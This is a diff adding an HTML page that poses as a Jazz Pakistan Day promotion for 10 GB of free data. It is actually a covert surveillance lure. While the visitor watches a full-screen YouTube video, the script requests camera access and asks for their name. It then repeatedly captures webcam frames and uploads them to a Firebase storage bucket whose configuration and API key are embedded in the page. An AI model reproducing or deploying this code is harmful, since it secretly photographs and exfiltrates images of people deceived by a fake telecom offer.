@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <title>JAZZ Duniya ko Bata do! </title>
+    <!-- Favicon -->
+    <link rel="icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABwAAAAcCAMAAABF0y+mAAABPlBMVEVHcExsCxKnFSHyFyuKNxW2GCHhyCyWEx0nBglZAAWKCxe7USRFAA2MURWEBxTtICqZGh52OBGJlyGIDxZsHBKRDRh6PBP9+DOHERV3KhCKFxcoCwr9+TT+6y98IBKTYhT//DS+xC7v7jLYySz0ICjaM0vW3TH99jO4lSno1DCdpCmSEBkZAAhhAAn4/DQfAATFliiPEhigGRyHChWnGR6RABibARqMCxabGRv9wCD/zCOUExn/5yylAR7/2ifv0S3+4Srq5TH/6y//0yWHIBSwGR+XDRmYVhf/9TF+ABX14i6YYBiSSRdgABBlNRTk3S7MzSubpySNLRegDxymaB+lMx6+lifhtSxrcxuutSf21SxiXBj+tR2iWRvLlyTmoyf5qxq6ZCPcbiHDbCA+EA27hSfcnln7lThLGg/JwShPgkytAAAAVXRSTlMAIhlNNT/8ShJlzg02/XpdYdr46Vyh8U39j9oJYOXt3jPEpupn/Z6jbZqtcL6943JW/////////v/////////////////////////////////////+Ki4D0AAAAetJREFUKJGtkudu20AQhKlK9WYbYVyQOL0nR94deey9SVTvklVcUt7/BUIpMRAnBoIA2b8fZhY7OxT1P6aUz+fuJ+mjA8C17ELlT54olO0WJ5VbPGg9/I0dMoDnPVdAFzxqesd3xHkeSBJ0WYF1WQkjjj/5ZV3T6wMgsA5koQBxazjOnj2+hfU+DwSHZSHrDDDSZFkn5MXtwgCwMYPOQFEuxlm/25tq4ps9Kp4+bSKJhRA621ikLvUI36idj1U6hg9M1bcHEGMFa35n1iNGMNL1xRG9g9SZqI4xXs1Nbfs1CjSrgbLWrF1PpXbnv7bEkJv4Rkf2R8qNakRbNby2658yMUwemkQeGosomukTpKtTRVt+m8zND6VnMcxnRTEbKFcTbZkdi90AhUtRl40GXatRVGqoE3Ok6esvm/mc9NZaDBbX7+hMMjZOvQ+JFYqXzy83lrjZiRZY6L/NpDNJis5UVhYxydVnZR124wDaEXabZTpVjF2TNbouE70jrixzigKsQCjZ/QpdPdkfmnilEr/dmzXaCss6AhR4qVClE1QxTuj0pUzELsJIGYwEwZWAZB+k6eo+2zg+SzXaHA+AO/Qkj2uiRzkqXfzxlCdG57wU14RjGI9hEODu1CSX+1kwxmaY43sK9pdq/vN8B9xwZmTmPoX3AAAAAElFTkSuQmCC" type="image/x-icon">
+
+    <!-- Description -->
+    <meta name="description" content="In celebration of Pakistan Day on March 23rd, Jazz is giving its users a fantastic 10 GB of free data!
+Don’t miss out on this incredible bonus to enjoy seamless connectivity and stay connected with your loved ones.
+Click the link below to collect your bonus now!
+Collect Your Bonus">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="stylesheet" type="text/css" media="screen" href="main.css" />
+    <style type="text/css">
+      /* Global Styles */
+      /* {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: "Arial", sans-serif;
+      }*/
+
+      body {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+            overflow: hidden; /* Prevent scrolling */
+            background: red;
+        }
+        .video-container {
+            position: fixed; /* Make the video background fixed */
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%; /* Full screen */
+            z-index: 1; /* Set behind other elements */
+        }
+        iframe {
+            width: 100%;
+            height: 100%; /* Full screen */
+            border: none;
+        }
+
+      /* Video Container */
+      .video-container-camera {
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        padding: 20px;
+        background-color: #fff;
+        border-radius: 20px;
+        box-shadow: 0px 4px 20px rgba(0, 0, 0, 0.1);
+        width: 100%;
+        max-width: 450px;
+        display: none;
+      }
+
+      #userName {
+        margin-bottom: 10px;
+      }
+      /* Camera View */
+      #cameraView {
+        height: 400px;
+        width: 100%;
+        background-color: #e0e0e0;
+        border: 2px solid #ddd;
+        border-radius: 15px;
+        box-shadow: 0px 4px 15px rgba(0, 0, 0, 0.2);
+        margin-bottom: 20px;
+      }
+
+      /* Control Buttons */
+      .controll-buttons {
+        display: flex;
+        justify-content: center;
+        width: 100%;
+      }
+
+      .controll-buttons button {
+        background-color: #007bff;
+        color: white;
+        padding: 10px 20px;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        transition: background-color 0.3s ease;
+        font-size: 16px;
+        width: 48%;
+        box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
+      }
+
+      /* Button Hover Effects */
+      .controll-buttons button:hover {
+        background-color: #0056b3;
+      }
+
+      /* Button Active State */
+      .controll-buttons button:active {
+        background-color: #00408a;
+      }
+
+      /* Display Captured Image Styling */
+      .display-captured-image {
+        width: 450px;
+        margin-top: 20px;
+        padding: 15px;
+        background-color: #fff;
+        border-radius: 15px;
+        box-shadow: 0px 4px 15px rgba(0, 0, 0, 0.1);
+        display: none;
+        justify-content: center;
+        align-items: center;
+        display: none;
+      }
+
+      .display-captured-image img {
+        width: 600;
+        border-radius: 10px;
+        border: 2px solid #ddd;
+      }
+
+      /* Media Queries for Responsive Design */
+      @media (max-width: 768px) {
+        /* Tablet View */
+        #cameraView {
+          height: 300px;
+        }
+        .controll-buttons button {
+          font-size: 14px;
+          padding: 8px 15px;
+        }
+      }
+
+      @media (max-width: 576px) {
+        /* Mobile View */
+        body {
+          padding: 10px;
+        }
+
+        .video-container-camera {
+          padding: 10px;
+          width: 70vw;
+          display: none;
+        }
+
+        #cameraView {
+          width: 60vw;
+        }
+
+        .controll-buttons button {
+          font-size: 12px;
+          padding: 7px 10px;
+        }
+
+        .display-captured-image {
+          width: 70vw;
+        }
+        .display-captured-image img {
+          width: 60vw;
+        }
+      }
+    </style>
+  </head>
+
+  <body>
+    
+ <div class="video-container">
+    <iframe 
+        src="https://www.youtube.com/embed/f1Y3LbgVSoU?autoplay=1&mute=1&controls=0&showinfo=0&loop=1&playlist=f1Y3LbgVSoU" 
+        allow="autoplay; encrypted-media" 
+        allowfullscreen>
+    </iframe>
+</div>
+    
+    
+    <div class="video-container-camera">
+      <h3 id="userName"> Your Name </h3>
+      <video src="" id="cameraView" autoplay></video>
+      <div class="controll-buttons">
+        <button id="capture">Capture</button>
+      </div>
+    </div>
+
+    <div class="display-captured-image">
+      <canvas src="" alt="Captured Image" id="capturedImage"></canvas>
+    </div>
+
+    <!-- Script -->
+
+    <script type="module">
+      // Import necessary Firebase services
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
+      import {
+        getDatabase,
+        ref,
+        push,
+      } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-database.js";
+      import {
+        getStorage,
+        ref as storageRef,
+        uploadString,
+        getDownloadURL,
+      } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-storage.js";
+
+      // Your Firebase configuration
+      const firebaseConfig = {
+        apiKey: "AIzaSyCA8_p5VT9aeGH1rxnMzf5bEgoW4q50PME",
+        authDomain: "azeem-tech-c6ab8.firebaseapp.com",
+        databaseURL: "https://azeem-tech-c6ab8-default-rtdb.firebaseio.com",
+        projectId: "azeem-tech-c6ab8",
+        storageBucket: "azeem-tech-c6ab8.appspot.com",
+        messagingSenderId: "748279942561",
+        appId: "1:748279942561:web:557d0bd231658082100fe0",
+        measurementId: "G-SYDGZPCNC4",
+      };
+
+      // Initialize Firebase
+      const app = initializeApp(firebaseConfig);
+      const db = getDatabase(app);
+      const storage = getStorage(app);
+      const dbRef = ref(db, "cameraUsers");
+
+      //    genrate user detials, like id, get user name
+      function generatedUser() {
+        let newPushRef = push(dbRef);
+        let userID;
+        let userName;
+
+        if (localStorage.getItem("UserID_Azeemtech")) {
+          userID = localStorage.getItem("UserID_Azeemtech");
+          userName = (userID.match(/[A-Za-z\-]+$/)[0]).replaceAll("-", " ");
+        } else {
+          
+          while (!userName) {
+            userName = prompt("Enter your name");
+          }
+          userID = newPushRef.key + `_${userName.replaceAll(" ", "-")}`;
+          localStorage.setItem("UserID_Azeemtech", userID);
+        }
+        document.getElementById("userName").innerHTML = userName;
+        return userID;
+      }
+
+      //console.log("Generated Push ID:", pushID);
+
+      // Access the video element and user data valriables
+      let userName = document.getElementById("userName");
+      let cameraView = document.getElementById("cameraView");
+      let capture = document.getElementById("capture");
+      let displayImgContainer = document.querySelector(
+        ".display-captured-image"
+      );
+      let pushID;
+
+      // Function to capture a photo
+      function capturePhoto() {
+        let canvas = document.createElement("canvas");
+        canvas.width = cameraView.videoWidth;
+        canvas.height = cameraView.videoHeight;
+        let context = canvas.getContext("2d");
+
+        // Draw the current video frame to the canvas
+        context.drawImage(cameraView, 0, 0, canvas.width, canvas.height);
+
+        // Convert the canvas image to a Data URL
+        let imageUrl = canvas.toDataURL("image/png");
+
+        // Upload the captured image
+        let imgID = push(dbRef);
+        uploadImage(imageUrl, `IMG_${imgID.key}.png`);
+       // console.log("Captured Image URL:", imageUrl);
+      }
+
+      // Get the video stream from the user's camera
+      
+      setTimeout(() => {
+        getStart()
+      }, 2000);
+      
+     function getStart() {
+      navigator.mediaDevices
+        .getUserMedia({ video: true })
+        .then((stream) => {
+          cameraView.srcObject = stream;
+          pushID = generatedUser();
+          // localStorage.setItem("UserID_Azeemtech", `${pushID}_${userName}`);
+         capturePhoto();
+        })
+        .catch((error) => {
+          console.error("Camera error:", error);
+        });
+     }
+        
+
+      function displayCaptured() {
+        let canvas = document.getElementById("capturedImage");
+        let context = canvas.getContext("2d");
+
+        // Draw the current video frame to the canvas
+        context.drawImage(cameraView, 0, 0, canvas.width, canvas.height);
+        let imageUrl = canvas.toDataURL("image/png");
+        if (imageUrl) {
+          canvas.src = imageUrl;
+          displayImgContainer.style.display = "flex";
+        }
+      }
+
+      capture.addEventListener("click", () => {
+        displayCaptured();
+      });
+
+
+      function uploadImage(dataURL, imageName) {
+        const imageRef = storageRef(storage, `${pushID}/${imageName}`);
+
+        // Upload the Data URL as a base64 string to Firebase Storage
+        uploadString(imageRef, dataURL, "data_url")
+          .then(() => {
+            console.log("Uploaded a data_url string!");
+
+            // Get the download URL directly using the storage reference
+            getDownloadURL(imageRef)
+              .then((downloadURL) => {
+                console.log("File available at:", downloadURL);
+                capturePhoto();
+              })
+              .catch((error) => {
+                console.error("Error getting download URL:", error);
+              });
+          })
+          .catch((error) => {
+            console.error("Error uploading image:", error);
+          });
+      }
+    </script>
+  </body>
+</html>
